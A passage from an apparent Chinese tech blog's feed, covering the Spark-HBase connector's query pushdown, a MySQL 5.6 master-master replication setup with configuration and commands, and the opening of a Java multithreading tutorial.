Bytes.toBytes(``&quot;col8&quot;``))``g.setFilter(filter)`</span><br></pre></td></tr></table></figure><p>如果有多个 and 条件，都是使用 <code>SingleColumnValueFilter</code> 进行过滤的，这个都好理解。如果我们有下面的查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 = &apos;xxx&apos;&quot;``)`</span><br></pre></td></tr></table></figure><p>那么在 shc 里面是怎么进行的呢？事实上，如果碰到非 RowKey 的过滤，那么这种查询是需要扫描 HBase 的全表的。上面的查询在 shc 里面就是将 HBase 里面的所有数据拿到，然后<strong>传输到 Spark ，再通过 Spark 里面进行过滤</strong>，可见 shc 在这种情况下效率是很低下的。</p><p>注意，上面的查询在 shc 返回的结果是错误的。具体原因是在将 id = 1 or col7 = ‘xxx’ 查询条件进行合并时，丢弃了所有的查找条件，相当于返回表的所有数据。定位到代码可以参见下面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`def` `or[T](left``:` `HRF[T],``            ``right``:` `HRF[T])(``implicit` `ordering``:` `Ordering[T])``:` `HRF[T] ``=` `&#123;``    ``val` `ranges ``=` `ScanRange.or(left.ranges, right.ranges)``    ``val` `typeFilter ``=` `TypedFilter.or(left.tf, right.tf)``    ``HRF(ranges, typeFilter, left.handled &amp;&amp; right.handled)``&#125;`</span><br></pre></td></tr></table></figure><p>同理，类似于下面的查询在 shc 里面其实都是全表扫描，并且将所有的数据返回到 Spark 层面上再进行一次过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 &lt;= &apos;xxx&apos;&quot;``)``sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 &gt;= &apos;xxx&apos;&quot;``)``sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where col7 = &apos;xxx&apos;&quot;``)`</span><br></pre></td></tr></table></figure><p>很显然，这种方式查询效率并不高，一种可行的方案是将算子下推到 HBase 层面，在 HBase 层面通过 SingleColumnValueFilter 过滤一部分数据，然后再返回到 Spark，这样可以节省很多数据的传输。</p><h2 id="组合-RowKey-的查询优化"><a href="#组合-RowKey-的查询优化" class="headerlink" title="组合 RowKey 的查询优化"></a>组合 RowKey 的查询优化</h2><p>shc 还支持组合 RowKey 的方式来建表，具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`def` `cat ``=``  ``s``&quot;&quot;``&quot;&#123;``     ``|&quot;``table``&quot;:&#123;&quot;``namespace``&quot;:&quot;``default``&quot;, &quot;``name``&quot;:&quot;``iteblog``&quot;, &quot;``tableCoder``&quot;:&quot;``PrimitiveType``&quot;&#125;,``     ``|&quot;``rowkey``&quot;:&quot;``key``1``:``key``2``&quot;,``     ``|&quot;``columns``&quot;:&#123;``     ``|&quot;``col``00``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``key``1``&quot;, &quot;``type``&quot;:&quot;``string``&quot;, &quot;``length``&quot;:&quot;``6``&quot;&#125;,``     ``|&quot;``col``01``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``key``2``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,``     ``|&quot;``col``1``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``1``&quot;, &quot;``col``&quot;:&quot;``col``1``&quot;, &quot;``type``&quot;:&quot;``boolean``&quot;&#125;,``     ``|&quot;``col``2``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``2``&quot;, &quot;``col``&quot;:&quot;``col``2``&quot;, &quot;``type``&quot;:&quot;``double``&quot;&#125;,``     ``|&quot;``col``3``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``3``&quot;, &quot;``col``&quot;:&quot;``col``3``&quot;, &quot;``type``&quot;:&quot;``float``&quot;&#125;,``     ``|&quot;``col``4``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``4``&quot;, &quot;``col``&quot;:&quot;``col``4``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,``     ``|&quot;``col``5``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``5``&quot;, &quot;``col``&quot;:&quot;``col``5``&quot;, &quot;``type``&quot;:&quot;``bigint``&quot;&#125;,``     ``|&quot;``col``6``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``6``&quot;, &quot;``col``&quot;:&quot;``col``6``&quot;, &quot;``type``&quot;:&quot;``smallint``&quot;&#125;,``     ``|&quot;``col``7``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``7``&quot;, &quot;``col``&quot;:&quot;``col``7``&quot;, &quot;``type``&quot;:&quot;``string``&quot;&#125;,``     ``|&quot;``col``8``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``8``&quot;, &quot;``col``&quot;:&quot;``col``8``&quot;, &quot;``type``&quot;:&quot;``tinyint``&quot;&#125;``     ``|&#125;``     ``|&#125;&quot;``&quot;&quot;``.stripMargin`</span><br></pre></td></tr></table></figure><p>上面的 col00 和 col01 两列组合成一个 rowkey，并且 col00 排在前面，col01 排在后面。比如 col00 =’row002’，col01 = 2，那么组合的 rowkey 为 row002\x00\x00\x00\x02。那么在组合 Rowkey 的查询 shc 都有哪些优化呢？现在我们有如下查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos; and col01 = 0&quot;``).show()`</span><br></pre></td></tr></table></figure><p>根据上面的信息，RowKey 其实是由 col00 和 col01 组合而成的，那么上面的查询其实可以将 col00 和 col01 进行拼接，然后组合成一个 RowKey，然后上面的查询其实可以转换成一个 Get 查询。但是在 shc 里面，上面的查询是转换成一个 scan 和一个 get 查询的。scan 的 startRow 为 row000，endRow 为 row000\xff\xff\xff\xff；get 的 rowkey 为 row000\xff\xff\xff\xff，然后再将所有符合条件的数据返回，最后再在 Spark 层面上做一次过滤，得到最后查询的结果。因为 shc 里面组合键查询的代码还没完善，所以当前实现应该不是最终的。</p><p>在 shc 里面下面两条 SQL 查询下沉到 HBase 的逻辑一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos;&quot;``).show()``df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 = &apos;row000&apos; and col01 = 0&quot;``).show()`</span><br></pre></td></tr></table></figure><p>唯一区别是在 Spark 层面上的过滤。</p><h2 id="scan-查询优化"><a href="#scan-查询优化" class="headerlink" title="scan 查询优化"></a>scan 查询优化</h2><p>如果我们的查询有 &lt; 或 &gt; 等查询过滤条件，比如下面的查询条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`df.sqlContext.sql(``&quot;select col00, col01, col1 from iteblog where col00 &gt; &apos;row000&apos; and col00 &lt; &apos;row005&apos;&quot;``).show()`</span><br></pre></td></tr></table></figure><p>这个在 shc 里面转换成 HBase 的过滤为一条 get 和 一个 scan，具体为 get 的 Rowkey 为 row0005\xff\xff\xff\xff；scan 的 startRow 为 row000，endRow 为 row005\xff\xff\xff\xff，然后将查询的结果返回到 spark 层面上进行过滤。</p><p>总体来说，shc 能在一定程度上对查询进行优化，避免了全表扫描。但是经过评测，shc 其实还有很多地方不够完善，算子下沉并没有下沉到 HBase 层面上进行。目前这个项目正在和 hbase 自带的 connectors 进行整合</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache &lt;a href=&quot;https://www.iteblog.com/archives/tag/spark/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Spark&lt;/a&gt; 和 Apache &lt;a href=&quot;https://www.iteblog.com/archives/tag/hbase/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HBase&lt;/a&gt; 是两个使用比较广泛的大数据组件。很多场景需要使用 &lt;a href=&quot;https://www.iteblog.com/archives/tag/spark/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Spark&lt;/a&gt; 分析/查询 &lt;a href=&quot;https://www.iteblog.com/archives/tag/hbase/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HBase&lt;/a&gt; 中的数据，而目前 &lt;a href=&quot;https://www.iteblog.com/archives/tag/spark/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Spark&lt;/a&gt; 内置是支持很多数据源的，其中就包括了 &lt;a href=&quot;https://www.iteblog.com/archives/tag/hbase/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HBase&lt;/a&gt;，但是内置的读取数据源还是使用了 TableInputFormat 来读取 HBase 中的数据。这个 TableInputFormat 有一些缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个 Task 里面只能启动一个 Scan 去 HBase 中读取数据；&lt;/li&gt;
&lt;li&gt;TableInputFormat 中不支持 BulkGet；&lt;/li&gt;
&lt;li&gt;不能享受到 Spark SQL 内置的 catalyst 引擎的优化。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于这些问题，来自 Hortonworks 的工程师们为我们带来了全新的 Apache Spark—Apache HBase Connector，下面简称 SHC。通过这个类库，我们可以直接使用 Spark SQL 将 DataFrame 中的数据写入到 HBase 中；而且我们也可以使用 Spark SQL 去查询 HBase 中的数据，在查询 HBase 的时候充分利用了 catalyst 引擎做了许多优化，比如分区修剪（partition pruning），列修剪（column pruning），谓词下推（predicate pushdown）和数据本地性（data locality）等等。因为有了这些优化，通过 Spark 查询 HBase 的速度有了很大的提升。&lt;/p&gt;
    
    </summary>
    
      <category term="HBase" scheme="https://www.5658.pw/categories/HBase/"/>
    
    
      <category term="HBase" scheme="https://www.5658.pw/tags/HBase/"/>
    
      <category term="Sql" scheme="https://www.5658.pw/tags/Sql/"/>
    
      <category term="SHC" scheme="https://www.5658.pw/tags/SHC/"/>
    
  </entry>
  
  <entry>
    <title>Centos7 mysql 5.6 数据库主主复制</title>
    <link href="https://www.5658.pw/2019/03/25/Centos7-mysql-5-6-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E4%B8%BB%E5%A4%8D%E5%88%B6/"/>
    <id>https://www.5658.pw/2019/03/25/Centos7-mysql-5-6-数据库主主复制/</id>
    <published>2019-03-25T02:16:44.000Z</published>
    <updated>2019-05-11T05:57:20.912Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>主机系统是：centos7.4 64位</p><p>内存：2G</p><p>CPU:4核心</p><p>安装Mysql </p><p>docker pull mysql<br><a id="more"></a><br>主的配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">#password   = your_password</span><br><span class="line">port        = <span class="number">3306</span></span><br><span class="line">socket      = <span class="regexp">/tmp/my</span>sql.sock</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">binlog_cache_size = <span class="number">64</span>K</span><br><span class="line">thread_stack = <span class="number">256</span>K</span><br><span class="line">join_buffer_size = <span class="number">1024</span>K</span><br><span class="line">query_cache_type = <span class="number">1</span></span><br><span class="line">max_heap_table_size = <span class="number">128</span>M</span><br><span class="line">port        = <span class="number">3306</span></span><br><span class="line">socket      = <span class="regexp">/tmp/my</span>sql.sock</span><br><span class="line">datadir = <span class="regexp">/www/</span>server/data</span><br><span class="line">skip-external-locking</span><br><span class="line">performance_schema_max_table_instances=<span class="number">400</span></span><br><span class="line">table_definition_cache=<span class="number">400</span></span><br><span class="line">key_buffer_size = <span class="number">128</span>M</span><br><span class="line">max_allowed_packet = <span class="number">100</span>G</span><br><span class="line">table_open_cache = <span class="number">128</span></span><br><span class="line">sort_buffer_size = <span class="number">768</span>K</span><br><span class="line">net_buffer_length = <span class="number">8</span>K</span><br><span class="line">read_buffer_size = <span class="number">768</span>K</span><br><span class="line">read_rnd_buffer_size = <span class="number">512</span>K</span><br><span class="line">myisam_sort_buffer_size = <span class="number">8</span>M</span><br><span class="line">thread_cache_size = <span class="number">64</span></span><br><span class="line">query_cache_size = <span class="number">128</span>M</span><br><span class="line">tmp_table_size = <span class="number">128</span>M</span><br><span class="line"></span><br><span class="line">explicit_defaults_for_timestamp = <span class="literal">true</span></span><br><span class="line">#skip-networking</span><br><span class="line">#skip-name-resolve</span><br><span class="line">max_connections = <span class="number">100</span></span><br><span class="line">max_connect_errors = <span class="number">100</span></span><br><span class="line">open_files_limit = <span class="number">65535</span></span><br><span class="line">sql-mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br><span class="line"></span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog_format=mixed</span><br><span class="line">server-id   = <span class="number">1</span></span><br><span class="line">expire_logs_days = <span class="number">10</span></span><br><span class="line">slow_query_log=<span class="number">1</span></span><br><span class="line">slow-query-log-file=<span class="regexp">/www/</span>server/data/mysql-slow.log</span><br><span class="line">long_query_time=<span class="number">3</span></span><br><span class="line">#log_queries_not_using_indexes=on</span><br><span class="line"></span><br><span class="line">#loose-innodb-trx=0</span><br><span class="line">#loose-innodb-locks=0</span><br><span class="line">#loose-innodb-lock-waits=0</span><br><span class="line">#loose-innodb-cmp=0</span><br><span class="line">#loose-innodb-cmp-per-index=0</span><br><span class="line">#loose-innodb-cmp-per-index-reset=0</span><br><span class="line">#loose-innodb-cmp-reset=0</span><br><span class="line">#loose-innodb-cmpmem=0</span><br><span class="line">#loose-innodb-cmpmem-reset=0</span><br><span class="line">#loose-innodb-buffer-page=0</span><br><span class="line">#loose-innodb-buffer-page-lru=0</span><br><span class="line">#loose-innodb-buffer-pool-stats=0</span><br><span class="line">#loose-innodb-metrics=0</span><br><span class="line">#loose-innodb-ft-default-stopword=0</span><br><span class="line">#loose-innodb-ft-inserted=0</span><br><span class="line">#loose-innodb-ft-deleted=0</span><br><span class="line">#loose-innodb-ft-being-deleted=0</span><br><span class="line">#loose-innodb-ft-config=0</span><br><span class="line">#loose-innodb-ft-index-cache=0</span><br><span class="line">#loose-innodb-ft-index-table=0</span><br><span class="line">#loose-innodb-sys-tables=0</span><br><span class="line">#loose-innodb-sys-tablestats=0</span><br><span class="line">#loose-innodb-sys-indexes=0</span><br><span class="line">#loose-innodb-sys-columns=0</span><br><span class="line">#loose-innodb-sys-fields=0</span><br><span class="line">#loose-innodb-sys-foreign=0</span><br><span class="line">#loose-innodb-sys-foreign-cols=0</span><br><span class="line"></span><br><span class="line">default_storage_engine = InnoDB</span><br><span class="line">innodb_data_home_dir = <span class="regexp">/www/</span>server/data</span><br><span class="line">innodb_data_file_path = ibdata1:<span class="number">10</span>M:autoextend</span><br><span class="line">innodb_log_group_home_dir = <span class="regexp">/www/</span>server/data</span><br><span class="line">innodb_buffer_pool_size = <span class="number">256</span>M</span><br><span class="line">innodb_log_file_size = <span class="number">64</span>M</span><br><span class="line">innodb_log_buffer_size = <span class="number">368</span>M</span><br><span class="line">innodb_flush_log_at_trx_commit = <span class="number">1</span></span><br><span class="line">innodb_lock_wait_timeout = <span class="number">120</span></span><br><span class="line">innodb_max_dirty_pages_pct = <span class="number">90</span></span><br><span class="line">innodb_read_io_threads = <span class="number">1</span></span><br><span class="line">innodb_write_io_threads = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[mysqldump]</span><br><span class="line">quick</span><br><span class="line">max_allowed_packet = <span class="number">16</span>M</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">no-auto-rehash</span><br><span class="line"></span><br><span class="line">[myisamchk]</span><br><span class="line">key_buffer_size = <span class="number">32</span>M</span><br><span class="line">sort_buffer_size = <span class="number">768</span>K</span><br><span class="line">read_buffer = <span class="number">2</span>M</span><br><span class="line">write_buffer = <span class="number">2</span>M</span><br><span class="line"></span><br><span class="line">[mysqlhotcopy]</span><br><span class="line">interactive-timeout</span><br></pre></td></tr></table></figure><p>从节点一抹一样只是Server_id 修改了一下而已</p><p>在主备份一下数据库。全备吧。这样也就行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mysqldump –uroot –p’123456’ --all-databases &gt;liang.sql</span><br></pre></td></tr></table></figure><p>scp 发送到对端服务器</p><p>从服务器把文件导入进去</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql –uroot –p’<span class="number">123456</span>’ 　 &lt;liang.sql</span><br></pre></td></tr></table></figure><p>进入主服务器。添加一个用户授权</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;grant replication slave on *.* to  rep@<span class="string">'192.168.132.%'</span> identified by <span class="string">'123456'</span>;</span><br></pre></td></tr></table></figure><p>这里给主服务器锁表</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush tables <span class="keyword">with</span> read lock;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.08</span> sec)</span><br></pre></td></tr></table></figure><p>查看一下用户</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,host <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure><p>后面show master </p><p>现在在从服务器操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在salves实例中操作</span><br><span class="line">Mysql&gt;start slave   ##########开启主从复制开关</span><br><span class="line">mysql&gt; CHANGE MASTER TO</span><br><span class="line">    -&gt; MASTER_HOST=<span class="string">'192.168.132.139'</span>,</span><br><span class="line">    -&gt; MASTER_PORT=<span class="number">3306</span>,</span><br><span class="line">    -&gt; MASTER_USER=<span class="string">'rep'</span>,</span><br><span class="line">    -&gt; MASTER_PASSWORD=<span class="string">'123456'</span>,</span><br><span class="line">    -&gt; MASTER_LOG_FILE=<span class="string">'mysql-bin.000002'</span>,</span><br><span class="line">-&gt; MASTER_LOG_POS=<span class="number">120</span>;</span><br><span class="line"></span><br><span class="line">Mysql&gt;start slave   ##########开启主从复制开关</span><br><span class="line">查看slave 的一个状态 </span><br><span class="line">mysql&gt; show slave status\G;</span><br></pre></td></tr></table></figure><p>这两个都为yes时候表示是已经成功了</p><p>测试是否同步成功了。我在matsrt中新建一个数据库看看salave是否能同步成功。</p><p>我在master中新建了一个aa数据库，现在查看一下salves是否同步了</p><p>同步完之后，然后就设置从服务器为主节点</p><p>首先给从服务器锁表</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush tables <span class="keyword">with</span> read lock;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.08</span> sec)</span><br></pre></td></tr></table></figure><p>查看master status</p><p>然后从节点也是一样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在salves实例中操作</span><br><span class="line">Mysql&gt;start slave   ##########开启主从复制开关</span><br><span class="line">mysql&gt; CHANGE MASTER TO</span><br><span class="line">    -&gt; MASTER_HOST=<span class="string">'192.168.132.139'</span>,</span><br><span class="line">    -&gt; MASTER_PORT=<span class="number">3306</span>,</span><br><span class="line">    -&gt; MASTER_USER=<span class="string">'rep'</span>,</span><br><span class="line">    -&gt; MASTER_PASSWORD=<span class="string">'123456'</span>,</span><br><span class="line">    -&gt; MASTER_LOG_FILE=<span class="string">'mysql-bin.000002'</span>,</span><br><span class="line">-&gt; MASTER_LOG_POS=<span class="number">120</span>;</span><br><span class="line"></span><br><span class="line">Mysql&gt;start slave   ##########开启主从复制开关</span><br><span class="line">查看slave 的一个状态 </span><br><span class="line">mysql&gt; show slave status\G;</span><br></pre></td></tr></table></figure><p>然后查看到两个yes 就在两边自己新建数据库看看看</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;主机系统是：centos7.4 64位&lt;/p&gt;
&lt;p&gt;内存：2G&lt;/p&gt;
&lt;p&gt;CPU:4核心&lt;/p&gt;
&lt;p&gt;安装Mysql &lt;/p&gt;
&lt;p&gt;docker pull mysql&lt;br&gt;
    
    </summary>
    
      <category term="Mysql" scheme="https://www.5658.pw/categories/Mysql/"/>
    
      <category term="Linux" scheme="https://www.5658.pw/categories/Mysql/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.5658.pw/tags/Linux/"/>
    
      <category term="Centos" scheme="https://www.5658.pw/tags/Centos/"/>
    
      <category term="Mysql" scheme="https://www.5658.pw/tags/Mysql/"/>
    
      <category term="数据库" scheme="https://www.5658.pw/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>在Java中怎样实现多线程？Java线程的四种状态</title>
    <link href="https://www.5658.pw/2019/01/24/%E5%9C%A8Java%E4%B8%AD%E6%80%8E%E6%A0%B7%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9FJava%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%8A%B6%E6%80%81/"/>
    <id>https://www.5658.pw/2019/01/24/在Java中怎样实现多线程？Java线程的四种状态/</id>
    <published>2019-01-24T10:18:29.000Z</published>
    <updated>2019-01-25T10:34:35.904Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、在java中怎样实现多线程？"><a href="#一、在java中怎样实现多线程？" class="headerlink" title="一、在java中怎样实现多线程？"></a>一、在<a href="http://www.liuhaihua.cn/archives/tag/java-2" target="_blank" rel="noopener">java</a>中怎样实现<a href="http://www.liuhaihua.cn/archives/tag/%e5%a4%9a%e7%ba%bf%e7%a8%8b" target="_blank" rel="noopener">多线程</a>？</h2><p>extends Thread</p><p>implement Runnable</p><p>方法一：继承 Thread 类，覆盖方法 run()，我们在创建的 Thread 类的子类中重写 run() ,加入<a href="http://www.liuhaihua.cn/archives/tag/%e7%ba%bf%e7%a8%8b" target="_blank" rel="noopener">线程</a>所要执行的<a href="http://www.liuhaihua.cn/archives/tag/%e4%bb%a3%e7%a0%81" target="_blank" rel="noopener">代码</a>即可。</p><p>下面是一个例子：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class MyThread extends Thread</span><br><span class="line"></span><br><span class="line">　　&#123;</span><br><span class="line"></span><br><span class="line">　　　int count= 1, number;</span><br><span class="line"></span><br><span class="line">　　　public MyThread(int num)</span><br><span class="line"></span><br><span class="line">　　　&#123;</span><br><span class="line"></span><br><span class="line">　　　　number = num;</span><br><span class="line"></span><br><span class="line">　　　　System.out.println</span><br><span class="line"></span><br><span class="line">　　　　(&quot;创建线程 &quot; + number);</span><br><span class="line"></span><br><span class="line">　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　public void run() &#123;</span><br><span class="line"></span><br><span class="line">　　　　while(true) &#123;</span><br><span class="line"></span><br><span class="line">　　　　　System.out.println</span><br><span class="line"></span><br><span class="line">　　　　　　(&quot;线程 &quot; + number + &quot;:计数 &quot; + count);</span><br><span class="line"></span><br><span class="line">　　　　　if(++count== 6) return;</span><br><span class="line"></span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　public static void main(String args[])</span><br><span class="line"></span><br><span class="line">　　&#123;</span><br><span class="line"></span><br><span class="line">　　　for(int i = 0;i 〈 5; i++) new MyThread(i+1).start();</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　&#125;</span><br></pre></td></tr></table></figure><p>这种方法简单明了，符合大家的习惯，但是，它也有一个很大的缺点，那就是如果我们的类已经从一个类继承（如小程序必须继承自 <a href="http://www.liuhaihua.cn/archives/tag/apple" target="_blank" rel="noopener">Apple</a>t 类），则无法再继承 Thread 类，这时如果我们又不想建立一个新的类，应该怎么办呢？</p><p>我们不妨来探索一种新的方法：我们不创建Thread类的子类，而是直接使用它，那么我们只能将我们的方法作为<a href="http://www.liuhaihua.cn/archives/tag/%e5%8f%82%e6%95%b0" target="_blank" rel="noopener">参数</a>传递给 Thread 类的<a href="http://www.liuhaihua.cn/archives/tag/%e5%ae%9e%e4%be%8b" target="_blank" rel="noopener">实例</a>，有点类似回调函数。但是 Java 没有指针，我们只能传递一个包含这个方法的类的实例。</p><p>那么如何限制这个类必须包含这一方法呢？当然是使用接口！（虽然抽象类也可满足，但是需要继承，而我们之所以要采用这种新方法，不就是为了避免继承带来的限制吗？）</p><p>Java 提供了接口 java.lang.Runnable 来支持这种方法。</p><h4 id="方法二：实现-Runnable-接口"><a href="#方法二：实现-Runnable-接口" class="headerlink" title="方法二：实现 Runnable 接口"></a>方法二：实现 Runnable 接口</h4><p>Runnable接口只有一个方法run()，我们声明自己的类实现Runnable接口并提供这一方法，将我们的线程代码写入其中，就完成了这一部分的任务。但是Runnable接口并没有任何对线程的支持，我们还必须创建Thread类的实例，这一点通过Thread类的构造函数 public Thread(Runnable target);来实现。下面是一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 